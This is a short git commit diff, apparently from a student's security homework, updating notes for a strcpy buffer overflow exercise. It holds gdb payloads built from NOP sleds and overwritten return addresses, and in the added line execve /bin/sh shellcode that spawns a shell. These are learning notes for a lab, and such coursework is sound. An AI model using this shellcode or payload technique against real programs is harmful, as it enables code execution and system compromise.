b2c9798d845418792eef368ba3064f248614b791
wfhendri11 <wfhendrix11@gmail.com>
2021-04-27 11:40:35 -0400

    commit before HW3

--- C Programs/strcpy.c
+++ C Programs/strcpy.c
@@ -34,9 +34,11 @@ int main(int argc, char** argv)
 
 0xbfffeeff
 
-run $(python -c 'print("\x90"*125 + "\x90"*4 + "\x08\x04\x84\xcb")')
+run $(python -c 'print("\x90"*125 + "\x90"*4 + "\x28\xee\xff\xbf")')
 
 // ravenclaw
 0x080484cb
 
 printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcb\x84\x04\x08");
+
+run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*488 + "\x90"*4 + "\x28\xee\xff\xbf")')
